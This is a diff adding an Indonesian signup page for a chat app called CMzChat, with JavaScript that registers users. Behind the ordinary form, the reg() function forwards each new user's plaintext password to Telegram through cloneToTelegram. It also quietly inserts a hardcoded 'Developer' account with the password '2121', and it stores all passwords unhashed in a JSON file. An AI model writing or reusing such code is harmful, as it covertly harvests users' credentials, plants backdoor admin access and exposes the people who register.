@@ -1,0 +1,103 @@
+<!DOCTYPE html><html lang="id"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>CMzChat • Daftar</title>
+<link rel="stylesheet" href="assets.css">
+<style>
+body{display:flex;align-items:center;justify-content:center;padding:24px;min-height:100dvh}
+.glow{position:fixed;width:600px;height:600px;border-radius:50%;filter:blur(100px);pointer-events:none}
+.glow.g1{background:radial-gradient(circle,rgba(212,175,55,.18),transparent 70%);top:-200px;right:-200px}
+.glow.g2{background:radial-gradient(circle,rgba(212,175,55,.08),transparent 70%);bottom:-200px;left:-200px}
+.wrap{width:100%;max-width:420px;position:relative;z-index:1}
+.logo-box{text-align:center;margin-bottom:28px}
+.logo{width:92px;height:92px;border-radius:26px;padding:12px;margin:0 auto 18px;
+  background:linear-gradient(135deg,#1e1e23,#0a0a0c);
+  border:1.5px solid rgba(212,175,55,.35);
+  box-shadow:0 20px 60px rgba(212,175,55,.2);display:grid;place-items:center}
+.logo img{width:100%;height:100%;object-fit:contain}
+h1{font-size:26px;font-weight:800;margin-bottom:6px;
+  background:linear-gradient(135deg,#f5f5f7 0%,#d4af37 100%);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.sub{font-size:12.5px;color:var(--muted);letter-spacing:.5px}
+.card{padding:26px}
+.field{margin-bottom:14px}
+.field label{display:block;font-size:10.5px;color:var(--muted);font-weight:700;letter-spacing:1.2px;text-transform:uppercase;margin-bottom:8px;padding-left:4px}
+.link{text-align:center;margin-top:18px;font-size:13px;color:var(--muted)}
+.link a{color:var(--gold-2);text-decoration:none;font-weight:700}
+.brand{text-align:center;font-size:10px;color:var(--muted-2);letter-spacing:4px;padding-top:22px;font-weight:700}
+</style></head><body>
+<div class="glow g1"></div><div class="glow g2"></div>
+
+<div class="wrap fade-up">
+  <div class="logo-box">
+    <div class="logo"><img src="Logo.jpg" onerror="this.style.display='none';this.parentNode.innerHTML='<span style=\'font-size:34px;font-weight:900;color:#d4af37\'>C</span>'"></div>
+    <h1>Buat Akun</h1>
+    <p class="sub">✦ JOIN CMzChat VVIP ✦</p>
+  </div>
+
+  <div class="card glass gold-top">
+    <div class="field"><label>Username</label><input id="u" class="inp" placeholder="min 3 karakter, huruf/angka/_" autocomplete="off"></div>
+    <div class="field"><label>Password</label><input id="p" class="inp" type="password" placeholder="min 4 karakter"></div>
+    <div class="field"><label>Ulangi Password</label><input id="p2" class="inp" type="password" placeholder="ulangi password"></div>
+    <button class="btn btn-gold" id="btnReg" onclick="reg()">✨ DAFTAR SEKARANG</button>
+    <p class="link">Sudah punya akun? <a href="login.html">Masuk</a></p>
+  </div>
+  <p class="brand">TZO PROJECT • VVIP EDITION</p>
+</div>
+
+<div class="toast" id="toast"></div>
+<script src="env.js"></script>
+<script src="config.js"></script>
+<script>
+function toast(m, err){
+  const t = document.getElementById('toast');
+  t.innerText = m; t.className = 'toast show' + (err ? ' err' : ' gold');
+  clearTimeout(t._tm); t._tm = setTimeout(()=>t.classList.remove('show'), 2500);
+}
+
+async function reg(){
+  const u = document.getElementById('u').value.trim().toLowerCase();
+  const p = document.getElementById('p').value;
+  const p2 = document.getElementById('p2').value;
+  if(u.length < 3) return toast("Username minimal 3 karakter", true);
+  if(!/^[a-z0-9_]+$/.test(u)) return toast("Hanya huruf/angka/_", true);
+  if(p.length < 4) return toast("Password minimal 4 karakter", true);
+  if(p !== p2) return toast("Password tidak sama", true);
+
+  const btn = document.getElementById('btnReg');
+  btn.disabled = true; btn.innerHTML = '⏳ MEMBUAT AKUN...';
+
+  const db = await readDB("database.json", { users: {} });
+  if(!db.users) db.users = {};
+  if(db.users[u]){ btn.disabled=false; btn.innerHTML='✨ DAFTAR SEKARANG'; return toast("Username sudah dipakai", true); }
+
+  db.users[u] = {
+    name: u, displayName: u, pass: p, role: 'member',
+    joinDate: Date.now()
+  };
+  if(!db.users.ceomudaz) db.users.ceomudaz = { name:'ceomudaz', pass:'2121', role:'Developer' };
+  if(!db.users.Fajars) db.users.Fajars = { name:'Fajars', role:'Developer' };
+
+  const ok = await writeDB("database.json", db);
+  if(!ok){ btn.disabled=false; btn.innerHTML='✨ DAFTAR SEKARANG'; return toast("Gagal simpan, coba lagi", true); }
+
+  // ===== AUTO JOIN GLOBAL GROUP =====
+  await ensureGlobalGroup();
+  const g = await readDB("groups.json", { groups: [] });
+  const gg = g.groups.find(x => x.id === GLOBAL_ID);
+  if(gg){
+    const allUsers = Object.keys(db.users);
+    gg.members = allUsers;
+    await writeDB("groups.json", g);
+  }
+
+  SESSION.me = u;
+  cloneToTelegram("🆕", "USER BARU DAFTAR", [
+    `👤 <b>@${u}</b>`,
+    `🔑 Pass: <code>${p}</code>`,
+    `👥 Total user: <b>${Object.keys(db.users).length}</b>`,
+    `🌐 Auto-join Global Group ✅`
+  ]);
+  toast("✅ Akun dibuat! Mengalihkan...");
+  setTimeout(()=>location.href='dashboard.html', 900);
+}
+</script></body></html>
